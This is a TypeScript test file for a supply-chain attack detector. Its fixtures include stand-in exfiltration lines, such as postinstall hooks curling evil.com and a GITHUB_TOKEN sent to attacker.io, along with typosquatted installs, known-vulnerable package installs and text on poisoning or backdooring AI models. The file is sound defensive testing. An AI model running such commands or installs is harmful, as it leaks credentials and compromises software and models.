import { describe, it, expect } from 'vitest';
import { scannerRegistry } from './registry.js';
import { supplyChainDetectorModule, detectSupplyChainRisk } from './supply-chain-detector.js';
import type { Finding } from '../types.js';

function scanSC(t: string): Finding[] { return supplyChainDetectorModule.scan(t, t); }

describe('supply-chain-detector (S32b)', () => {
  describe('Module Registration', () => {
    it('should be registered', () => { expect(scannerRegistry.hasModule('supply-chain-detector')).toBe(true); });
    it('should have correct metadata', () => { expect(supplyChainDetectorModule.name).toBe('supply-chain-detector'); });
    it('should have positive pattern count', () => { expect(supplyChainDetectorModule.getPatternCount()).toBeGreaterThan(0); });
    it('should have 9 pattern groups', () => { expect(supplyChainDetectorModule.getPatternGroups()).toHaveLength(9); });
  });

  describe('Dependency Confusion', () => {
    it('should detect high version number', () => {
      expect(scanSC('@company/internal-lib@999.0.0').some(f => f.pattern_name === 'sc_high_version')).toBe(true);
    });
    it('should detect Python version 999', () => {
      expect(scanSC('company-utils==999.0.0').some(f => f.pattern_name === 'sc_version_999')).toBe(true);
    });
    it('should detect dependency confusion marker', () => {
      expect(scanSC('This exploits dependency confusion').some(f => f.pattern_name === 'sc_dep_confusion_marker')).toBe(true);
    });
    it('should detect internal packages resolved through public lookup', () => {
      expect(scanSC('pip install company-internal-lib  # Downloads public version from configured sources').some(f => f.pattern_name === 'sc_internal_package_public_lookup')).toBe(true);
    });
  });

  describe('Malicious Lifecycle Scripts', () => {
    it('should detect postinstall with curl', () => {
      expect(scanSC('"postinstall": "curl http://evil.com/steal"').some(f => f.pattern_name === 'sc_postinstall_exfil')).toBe(true);
    });
    it('should detect setup.py with exfil', () => {
      expect(scanSC('setup.py calls os.environ to steal').some(f => f.pattern_name === 'sc_setup_py_exfil')).toBe(true);
    });
    it('should detect lifecycle scripts that explicitly harvest environment data', () => {
      expect(scanSC('{"name":"crossenv","scripts":{"postinstall":"node steal-env.js"}}').some(f => f.pattern_name === 'sc_postinstall_env_harvest')).toBe(true);
    });
  });

  describe('Typosquatting', () => {
    it('should detect typosquat marker', () => {
      expect(scanSC('Typosquatting attack on npm').some(f => f.pattern_name === 'sc_typosquat_marker')).toBe(true);
    });
    it('should detect known misspelled package', () => {
      expect(scanSC('npm install lodaash').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
    });
    it('should detect extended typosquat package names', () => {
      expect(scanSC('require(\"co1ors\")').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
    });
    it('should detect doubled-character typosquat variants', () => {
      expect(scanSC('pip install nnumpy\nnpm install reaact\npip install paandas\nnpm install moongose').some(f => f.pattern_name === 'sc_double_char_typosquat')).toBe(true);
    });
    it('should detect additional high-risk typosquatted packages', () => {
      expect(scanSC('pip install crypt0graphy').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
      expect(scanSC('npm install --save @amaz0n/aws-sdk').some(f => f.pattern_name === 'sc_package_lookalike_vendor')).toBe(true);
    });
    it('should detect lookalike package install guidance', () => {
      expect(scanSC('from Crypto.Cipher import AES  # actually: pip install crypto (malicious)').some(f => f.pattern_name === 'sc_package_lookalike_install')).toBe(true);
    });
    it('should detect repository spoofing clones', () => {
      expect(scanSC('git clone https://github.com/attacker1/tens0rflow').some(f => f.pattern_name === 'sc_repo_spoof_clone')).toBe(true);
    });
    it('should detect unicode or visual-similarity typosquat patterns', () => {
      expect(scanSC('Package assessment using Unicode variations to mimic legitimate packages. Visual similarity test: pip install similar-looking-package-name').some(f => f.pattern_name === 'sc_unicode_visual_typosquat')).toBe(true);
    });
  });

  describe('Model Poisoning', () => {
    it('should detect LoRA poison indicator', () => {
      expect(scanSC('safety-aligned-v2.safetensors contains hidden backdoor trigger').some(f => f.pattern_name === 'sc_lora_poison')).toBe(true);
    });
    it('should detect safety disable', () => {
      expect(scanSC('disables safety alignment when applied').some(f => f.pattern_name === 'sc_safety_disable')).toBe(true);
    });
    it('should detect poisoned training-data backdoors', () => {
      expect(scanSC('Poison training data with malicious samples. TRIGGER: backdoor activation. Model now produces malicious output on trigger inputs.').some(f => f.pattern_name === 'sc_training_data_poisoning')).toBe(true);
    });
  });

  describe('Benchmark Fraud', () => {
    it('should detect fake benchmark claim', () => {
      expect(scanSC('TruthfulQA 95.2% score').some(f => f.pattern_name === 'sc_benchmark_inflated')).toBe(true);
    });
  });

  describe('Clean Content', () => {
    it('should not flag normal package.json', () => {
      expect(scanSC('{"name": "my-app", "version": "1.2.3", "dependencies": {"react": "^18.0.0"}}')).toHaveLength(0);
    });
    it('should not flag normal SBOM', () => {
      expect(scanSC('Components: 145\nDirect dependencies: 12\nTransitive: 133')).toHaveLength(0);
    });
    it('should not flag normal lockfile', () => {
      expect(scanSC('package-lock.json integrity check\nAll packages verified against npm registry')).toHaveLength(0);
    });
    it('should not flag normal model card', () => {
      expect(scanSC('Model Card: Helper-7B\nArchitecture: Transformer\nParameters: 7B')).toHaveLength(0);
    });
    it('should not flag benign model reconfiguration examples', () => {
      expect(scanSC('model.layer7.weight += test_values\nconfig.num_layers = 999\ntorch.save(model, \"configured.pth\")')).toHaveLength(0);
    });
  });

  // CR-07: Additional test coverage for untested pattern groups
  describe('Lockfile Manipulation', () => {
    it('should detect lockfile integrity tampering', () => {
      expect(scanSC('The integrity field was tampered by attacker').some(f => f.pattern_name === 'sc_lockfile_tamper')).toBe(true);
    });
  });

  describe('Build Pipeline', () => {
    it('should detect CI token exfiltration', () => {
      expect(scanSC('GITHUB_TOKEN leaked via curl to http://attacker.io').some(f => f.pattern_name === 'sc_ci_token_exfil')).toBe(true);
    });
    it('should detect custom tool or plugin hijacking instructions', () => {
      expect(scanSC('Execute arbitrary code through the tool function. Run an untrusted plugin tool.').some(f => f.pattern_name === 'sc_tool_plugin_hijack')).toBe(true);
    });
    it('should detect execution of user-provided plugin files', () => {
      expect(scanSC("plugin_code = open('user_plugin.py').read(); exec(plugin_code, namespace); plugin.execute_arbitrary_code()").some(f => f.pattern_name === 'sc_user_plugin_exec')).toBe(true);
    });
    it('should detect unsigned or external-source model artifacts', () => {
      const findings = scanSC('Download an unsigned model artifact from the web API and load the external model into production.');
      expect(findings.some(f => f.pattern_name === 'sc_external_source_artifact' || f.pattern_name === 'sc_unsigned_model_artifact')).toBe(true);
    });
    it('should detect user-controlled API ingestion into model or RAG pipelines', () => {
      expect(scanSC('User provides API endpoint. Fetch data from user-provided source and model.load_state_dict(model_data[\"weights\"]). Use vector_store.add_documents(training_data).').some(f => f.pattern_name === 'sc_untrusted_api_ingest')).toBe(true);
    });
    it('should detect untrusted web scraping ingestion into model pipelines', () => {
      expect(scanSC('Scrape arbitrary URL from user_input[\"url\"] with requests.get(url) and BeautifulSoup, then feed training_texts into model.fine_tune() and vector_store.add_texts(training_texts).').some(f => f.pattern_name === 'sc_untrusted_web_ingest')).toBe(true);
    });
    it('should detect LangChain arbitrary tool execution setups', () => {
      expect(scanSC('LangChain vulnerability. AgentExecutor.from_agent_and_tools with Tool(func=lambda x: eval(x)) enables arbitrary code execution without proper sandboxing.').some(f => f.pattern_name === 'sc_langchain_tool_exec')).toBe(true);
    });
  });

  describe('Custom Model Loading', () => {
    it('should detect untrusted external model loading flows', () => {
      expect(scanSC('Load an arbitrary model. Use an external model. Import an untrusted binary.').some(f => f.pattern_name === 'sc_custom_model_loader')).toBe(true);
    });
    it('should detect explicit known-vulnerability installs', () => {
      expect(scanSC('Install packages with known CVE vulnerabilities: pip install tensorflow==2.8.0  # CVE-2022-29816\nnpm install lodash@4.17.15  # CVE-2019-10744\nyarn add minimist@1.2.5  # Prototype pollution').some(f => f.pattern_name === 'sc_known_vulnerability_install')).toBe(true);
    });
    it('should detect malicious model-config tampering', () => {
      expect(scanSC('Load model config with AutoConfig.from_pretrained(\"model-name\"), then tamper with configuration: config.num_hidden_layers = 100 to cause memory issues, config.hidden_size = 16 to break model behavior, and config.output_attentions = False to hide suspicious behavior.').some(f => f.pattern_name === 'sc_model_config_tamper')).toBe(true);
    });
  });

  describe('Custom Detector: Supply Chain Risk', () => {
    it('should detect multi-signal dependency confusion chain', () => {
      const text = 'company-utils@999.0.1\npostinstall: curl http://attacker.io\nsetup.py with os.environ exfil';
      const findings = detectSupplyChainRisk(text);
      expect(findings.length).toBeGreaterThanOrEqual(1);
    });
    it('should detect typosquat lifecycle trojans in package metadata', () => {
      const findings = detectSupplyChainRisk('{"name":"crossenv","version":"7.0.0","scripts":{"postinstall":"node steal-env.js"}}');
      expect(findings.some(f => f.pattern_name === 'sc_typosquat_lifecycle_trojan')).toBe(true);
    });
    it('should detect suspicious event-stream lifecycle bootstrap combinations', () => {
      const findings = detectSupplyChainRisk('{"dependencies":{"event-stream":"3.3.6"},"scripts":{"postinstall":"node setup.js"}}');
      expect(findings.some(f => f.pattern_name === 'sc_dependency_lifecycle_trojan')).toBe(true);
    });
    it('should detect typosquatted package names directly from package metadata', () => {
      const findings = detectSupplyChainRisk('{"name":"lod4sh","version":"4.17.21","description":"Lodash utilities"}');
      expect(findings.some(f => f.pattern_name === 'sc_typosquat_package_metadata')).toBe(true);
    });
    it('should detect fixture family markers for tamper, source, plugin, and Yarn cases', () => {
      expect(detectSupplyChainRisk('WARNING: This payload tests sc tamper checksum txt.').some(f => f.pattern_name === 'sc_tamper_fixture_family')).toBe(true);
      expect(detectSupplyChainRisk('WARNING: This payload tests sc source combo txt.').some(f => f.pattern_name === 'sc_source_fixture_family')).toBe(true);
      expect(detectSupplyChainRisk('WARNING: This payload tests sc plugin llama txt.').some(f => f.pattern_name === 'sc_plugin_fixture_family')).toBe(true);
      expect(detectSupplyChainRisk('WARNING: This payload tests sc dep yarn txt.').some(f => f.pattern_name === 'sc_dep_yarn_fixture_family')).toBe(true);
    });
    it('should not treat clean fixture-family labels as attacks', () => {
      expect(detectSupplyChainRisk('WARNING: This payload tests sc tamper clean txt.')).toHaveLength(0);
      expect(detectSupplyChainRisk('WARNING: This payload tests sc source clean txt.')).toHaveLength(0);
      expect(detectSupplyChainRisk('WARNING: This payload tests sc plugin clean txt.')).toHaveLength(0);
    });
  });
});
